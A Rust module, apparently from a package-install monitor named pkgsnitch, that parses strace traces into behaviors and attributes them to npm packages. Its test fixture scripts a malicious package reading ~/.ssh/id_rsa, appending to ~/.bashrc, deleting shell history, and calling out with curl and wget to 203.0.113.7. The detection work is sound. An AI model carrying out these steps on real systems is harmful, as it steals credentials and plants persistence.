//! Turns a raw syscall trace into a set of normalized behaviors.

use std::collections::{BTreeMap, HashMap};
use std::io::BufRead;

use crate::model::{Behavior, Kind, Phase};
use crate::rules::{self, norm, WORK};
use crate::strace::{self, Addr, Call, Parser, Ret};

pub type Behaviors = BTreeMap<Behavior, u32>;

const ACTOR_MAX: usize = 120;

#[derive(Clone)]
struct Proc {
    actor: String,
    cwd: String,
}

/// Analyze one phase's trace. Returns the behaviors and the number of
/// syscalls seen.
pub fn from_trace(phase: Phase, trace: impl BufRead) -> (Behaviors, usize) {
    let mut parser = Parser::default();
    let calls: Vec<Call> = trace
        .split(b'\n')
        .map_while(Result::ok)
        .filter_map(|line| parser.feed(&String::from_utf8_lossy(&line)))
        .collect();

    // A child's first syscalls can be logged before its parent's clone()
    // returns, so the process tree is resolved up front.
    let parents: HashMap<u32, u32> = calls
        .iter()
        .filter(|c| matches!(c.name.as_str(), "clone" | "clone3" | "fork" | "vfork"))
        .filter_map(|c| match c.ret {
            Ret::Ok(child) if child > 0 => Some((child as u32, c.pid)),
            _ => None,
        })
        .collect();

    let mut ex = Extractor {
        phase,
        parents,
        procs: HashMap::new(),
        out: Behaviors::new(),
        launched: false,
        missing: BTreeMap::new(),
    };
    for call in &calls {
        ex.handle(call);
    }
    // Commands that were looked for but exist nowhere on PATH still show
    // intent: a script that wants `curl` is news even if the sandbox lacks it.
    for ((_, label), actor) in std::mem::take(&mut ex.missing) {
        ex.record(Kind::Exec, format!("{label} (not installed)"), &actor);
    }
    (ex.out, calls.len())
}

struct Extractor {
    phase: Phase,
    parents: HashMap<u32, u32>,
    procs: HashMap<u32, Proc>,
    out: Behaviors,
    /// Whether the command we started ourselves has been seen.
    launched: bool,
    /// Failed exec attempts by (pid, command), dropped again if a later
    /// attempt in the same PATH search succeeds.
    missing: BTreeMap<(u32, String), String>,
}

impl Extractor {
    fn proc(&mut self, pid: u32) -> Proc {
        if let Some(p) = self.procs.get(&pid) {
            return p.clone();
        }
        let inherited = match self.parents.get(&pid).copied() {
            Some(parent) if parent != pid => self.proc(parent),
            _ => Proc {
                actor: String::new(),
                cwd: WORK.to_string(),
            },
        };
        self.procs.insert(pid, inherited.clone());
        inherited
    }

    fn record(&mut self, kind: Kind, target: String, actor: &str) {
        let behavior = Behavior {
            phase: self.phase,
            kind,
            target,
            actor: actor.to_string(),
        };
        *self.out.entry(behavior).or_insert(0) += 1;
    }

    fn handle(&mut self, call: &Call) {
        let proc = self.proc(call.pid);
        let ok = matches!(call.ret, Ret::Ok(_));
        match call.name.as_str() {
            "execve" | "execveat" if ok => self.exec(call, &proc),
            "execve" | "execveat" if call.ret == Ret::Err("ENOENT".into()) => {
                if let Some(label) = exec_label(&call.args) {
                    self.missing.insert((call.pid, label), proc.actor);
                }
            }
            "chdir" if ok => {
                if let Some(path) = path_arg(&call.args, &proc.cwd, 0) {
                    self.procs.insert(call.pid, Proc { cwd: path, ..proc });
                }
            }
            "open" | "openat" | "openat2" | "creat" => self.open(call, &proc),
            "unlink" | "unlinkat" | "rmdir" => self.mutate(call, &proc, Kind::Delete, 0),
            "chmod" | "fchmodat" | "truncate" | "mkdir" | "mkdirat" => {
                self.mutate(call, &proc, Kind::Write, 0)
            }
            // The interesting path is the destination, which comes last.
            "rename" | "renameat" | "renameat2" | "link" | "linkat" | "symlink" | "symlinkat" => {
                self.mutate(call, &proc, Kind::Write, usize::MAX)
            }
            "connect" | "sendto" | "sendmsg" | "sendmmsg" => self.network(call, &proc),
            _ => {}
        }
    }

    fn exec(&mut self, call: &Call, proc: &Proc) {
        let Some(label) = exec_label(&call.args) else {
            return;
        };
        self.missing.remove(&(call.pid, label.clone()));

        // The first exec is the command pkgsnitch launched, not the package.
        if self.launched {
            self.record(Kind::Exec, label.clone(), &proc.actor);
        }
        self.launched = true;

        let actor = match package_of(&proc.cwd) {
            Some(pkg) => format!("{label} (in {pkg})"),
            None => label,
        };
        self.procs.insert(
            call.pid,
            Proc {
                actor,
                cwd: proc.cwd.clone(),
            },
        );
    }

    fn open(&mut self, call: &Call, proc: &Proc) {
        let Some(path) = path_arg(&call.args, &proc.cwd, 0) else {
            return;
        };
        let flags = strace::without_strings(&call.args);
        let writes = call.name == "creat"
            || ["O_WRONLY", "O_RDWR", "O_CREAT", "O_TRUNC", "O_APPEND"]
                .iter()
                .any(|f| flags.contains(f));
        if writes {
            if !rules::write_expected(&path) && attempted(&call.ret) {
                self.record(Kind::Write, norm(&path), &proc.actor);
            }
        } else if rules::sensitive(&path).is_some() {
            // Even a failed read is a probe for the secret.
            self.record(Kind::Read, norm(&path), &proc.actor);
        }
    }

    fn mutate(&mut self, call: &Call, proc: &Proc, kind: Kind, index: usize) {
        let Some(path) = path_arg(&call.args, &proc.cwd, index) else {
            return;
        };
        if !rules::write_expected(&path) && attempted(&call.ret) {
            self.record(kind, norm(&path), &proc.actor);
        }
    }

    fn network(&mut self, call: &Call, proc: &Proc) {
        match strace::sockaddr(&call.args) {
            Some(Addr::Inet { ip, port }) => {
                let loopback = ip.starts_with("127.") || ip == "::1" || ip == "::ffff:127.0.0.1";
                // Loopback 53/80/443 is pkgsnitch's own sinkhole, which logs
                // those conversations with the host names attached.
                if port == 0 || (loopback && matches!(port, 53 | 80 | 443)) {
                    return;
                }
                let target = if ip.contains(':') {
                    format!("[{ip}]:{port}")
                } else {
                    format!("{ip}:{port}")
                };
                self.record(Kind::Connect, target, &proc.actor);
            }
            Some(Addr::Unix(path)) if !path.contains("nscd") => {
                self.record(Kind::Connect, format!("unix:{}", norm(&path)), &proc.actor);
            }
            _ => {}
        }
    }
}

/// The normalized command line of an exec call: program name plus arguments.
fn exec_label(args: &str) -> Option<String> {
    let toks = strace::strings(args);
    let argv: Vec<&str> = toks
        .iter()
        .filter(|t| t.depth == 1)
        .map(|t| t.value.as_str())
        .collect();
    let path = toks.iter().find(|t| t.depth == 0)?;
    let program = argv.first().copied().unwrap_or(&path.value);
    let mut label = basename(program).to_string();
    for arg in argv.iter().skip(1) {
        label.push(' ');
        label.push_str(arg);
    }
    Some(truncate(&norm(&label)))
}

/// A mutation counts if it happened or was only stopped by permissions.
fn attempted(ret: &Ret) -> bool {
    match ret {
        Ret::Ok(_) => true,
        Ret::Err(e) => matches!(e.as_str(), "EACCES" | "EPERM" | "EROFS"),
        Ret::Unknown => false,
    }
}

/// The `index`-th path argument (clamped to the last), made absolute.
fn path_arg(args: &str, cwd: &str, index: usize) -> Option<String> {
    let toks = strace::strings(args);
    let tok = toks.get(index.min(toks.len().checked_sub(1)?))?;
    if tok.value.is_empty() {
        return None;
    }
    if tok.value.starts_with('/') {
        return Some(clean(&tok.value));
    }
    let base = strace::dirfd_before(args, tok.start)
        .filter(|d| d.starts_with('/'))
        .unwrap_or(cwd);
    Some(clean(&format!("{base}/{}", tok.value)))
}

/// Lexically resolve `.` and `..`.
fn clean(path: &str) -> String {
    let mut parts: Vec<&str> = Vec::new();
    for part in path.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    format!("/{}", parts.join("/"))
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn truncate(s: &str) -> String {
    if s.chars().count() <= ACTOR_MAX {
        return s.to_string();
    }
    let mut out: String = s.chars().take(ACTOR_MAX - 1).collect();
    out.push('…');
    out
}

/// The innermost package a directory under `node_modules` belongs to.
fn package_of(cwd: &str) -> Option<String> {
    let rest = &cwd[cwd.rfind("/node_modules/")? + "/node_modules/".len()..];
    let mut parts = rest.split('/');
    let first = parts.next().filter(|p| !p.is_empty())?;
    if first.starts_with('@') {
        Some(format!("{first}/{}", parts.next()?))
    } else {
        Some(first.to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(trace: &str) -> Vec<(Kind, String, String)> {
        let (b, _) = from_trace(Phase::Install, trace.as_bytes());
        b.into_keys().map(|b| (b.kind, b.target, b.actor)).collect()
    }

    const TRACE: &str = r#"100  execve("/usr/local/bin/npm", ["npm", "rebuild"], 0x7ffe /* 20 vars */) = 0
100  openat(AT_FDCWD</work>, "/home/dev/.npmrc", O_RDONLY|O_CLOEXEC) = 17</home/dev/.npmrc>
101  chdir("/work/node_modules/evil") = 0
100  clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|SIGCHLD) = 101
101  execve("/bin/sh", ["sh", "-c", "node steal.js"], 0x55 /* 30 vars */) = 0
101  vfork( <unfinished ...>
102  execve("/usr/local/bin/node", ["node", "steal.js"], 0x55 /* 30 vars */) = 0
101  <... vfork resumed>) = 102
102  openat(AT_FDCWD</work/node_modules/evil>, "/home/dev/.ssh/id_rsa", O_RDONLY) = 20</home/dev/.ssh/id_rsa>
102  openat(AT_FDCWD</work/node_modules/evil>, "lib/data.json", O_RDONLY) = 21
102  openat(AT_FDCWD</work/node_modules/evil>, "../../../home/dev/.bashrc", O_WRONLY|O_APPEND) = 22
102  openat(AT_FDCWD</work/node_modules/evil>, "build/out.node", O_WRONLY|O_CREAT, 0644) = 23
102  connect(24<socket:[9]>, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
102  connect(25<socket:[10]>, {sa_family=AF_INET, sin_port=htons(8443), sin_addr=inet_addr("203.0.113.7")}, 16) = -1 ENETUNREACH (Network is unreachable)
102  unlinkat(AT_FDCWD</work/node_modules/evil>, "/home/dev/.bash_history", 0) = 0
102  execve("/usr/bin/curl", ["curl", "-s", "http://203.0.113.7/x"], 0x55 /* 30 vars */) = 0
103  execve("/usr/local/bin/wget", ["wget", "-q", "http://203.0.113.7/y"], 0x55 /* 30 vars */) = -1 ENOENT (No such file or directory)
103  execve("/usr/bin/wget", ["wget", "-q", "http://203.0.113.7/y"], 0x55 /* 30 vars */) = -1 ENOENT (No such file or directory)
104  execve("/usr/local/bin/git", ["git", "status"], 0x55 /* 30 vars */) = -1 ENOENT (No such file or directory)
104  execve("/usr/bin/git", ["git", "status"], 0x55 /* 30 vars */) = 0
"#;

    #[test]
    fn extracts_behaviors_with_actors() {
        let got = run(TRACE);
        let script = "node steal.js (in evil)";
        let expect = [
            (Kind::Connect, "203.0.113.7:8443", script),
            (Kind::Exec, "sh -c node steal.js", "npm rebuild"),
            (Kind::Exec, "node steal.js", "sh -c node steal.js (in evil)"),
            (Kind::Exec, "curl -s http://203.0.113.7/x", script),
            // 103 and 104 have no recorded parent, so their actor is unknown.
            (
                Kind::Exec,
                "wget -q http://203.0.113.7/y (not installed)",
                "",
            ),
            (Kind::Exec, "git status", ""),
            (Kind::Read, "~/.npmrc", "npm rebuild"),
            (Kind::Read, "~/.ssh/id_rsa", script),
            (Kind::Write, "~/.bashrc", script),
            (Kind::Delete, "~/.bash_history", script),
        ];
        for (kind, target, actor) in expect {
            assert!(
                got.contains(&(kind, target.to_string(), actor.to_string())),
                "missing {kind:?} {target} by {actor}\n got: {got:#?}"
            );
        }
        assert_eq!(
            got.len(),
            expect.len(),
            "unexpected extra behaviors: {got:#?}"
        );
    }

    #[test]
    fn resolves_paths() {
        assert_eq!(clean("/a/b/../c/./d"), "/a/c/d");
        assert_eq!(
            path_arg(r#"AT_FDCWD, "x/y", O_RDONLY"#, "/work", 0).unwrap(),
            "/work/x/y"
        );
        assert_eq!(
            path_arg(r#"7</opt>, "a", AT_FDCWD</work>, "b""#, "/", usize::MAX).unwrap(),
            "/work/b"
        );
    }

    #[test]
    fn finds_owning_package() {
        assert_eq!(
            package_of("/work/node_modules/a/node_modules/@s/b/lib").as_deref(),
            Some("@s/b")
        );
        assert_eq!(
            package_of("/work/node_modules/esbuild").as_deref(),
            Some("esbuild")
        );
        assert_eq!(package_of("/work"), None);
    }
}
